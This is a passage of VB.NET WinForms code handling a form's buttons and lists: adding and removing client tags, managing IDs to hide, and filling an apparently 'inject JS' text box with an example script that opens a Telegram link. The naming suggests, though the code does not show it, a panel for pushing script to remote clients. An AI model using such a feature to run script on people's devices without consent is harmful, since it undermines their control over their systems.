            jectjstext.ReadOnly = True
            checkonejs.Enabled = False
            checkonejs.Enabled = False
            checkonejs.Visible = False
            jectjstext.Text = ""

            jectjstext.Text = "//Example:" & vbNewLine & vbNewLine &
                  "if(confirm('Join telegram channel')){" & vbNewLine &
                  "    window.open('https://t.me/test','_blank');" & vbNewLine &
                  "}"


        End If
    End Sub

    Private Sub DrakeUIButtonIcon5_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon5.Click
        If Not String.IsNullOrEmpty(clitag.Text) Then
            If Not ListTags.Items.Contains(clitag.Text) Then
                ListTags.Items.Add(clitag.Text)

                TagsManager.AddTag(clitag.Text)
                clitag.Text = ""
            End If
        End If
    End Sub

    Private Sub DrakeUIButtonIcon4_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon4.Click
        If ListTags.Items.Count > 0 Then
            If ListTags.SelectedItem IsNot Nothing Then
                Dim clienttag As String = ListTags.GetItemText(ListTags.SelectedItem)
                ListTags.Items.Remove(ListTags.SelectedItem)
                TagsManager.RemoveTag(clienttag)
            End If

        End If
    End Sub

    Private LastSelectedTag As String = ""
    Private Sub ListTags_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListTags.SelectedIndexChanged
        LastSelectedTag = ListTags.GetItemText(ListTags.SelectedItem)
    End Sub

    Private Sub DrakeUIButtonIcon7_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon7.Click
        '
        If Not String.IsNullOrEmpty(idtohidetext.Text) Then
            If Not Listhides.Items.Contains(idtohidetext.Text) Then
                Listhides.Items.Add(idtohidetext.Text)


                idtohidetext.Text = ""
            End If
        End If
    End Sub

    Private Sub DrakeUIButtonIcon6_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon6.Click
        If Listhides.Items.Count > 0 Then
            If Listhides.SelectedItem IsNot Nothing Then
                Dim clienttag As String = Listhides.GetItemText(Listhides.SelectedItem)
                Listhides.Items.Remove(Listhides.SelectedItem)

            End If

        End If
    End Sub
End Class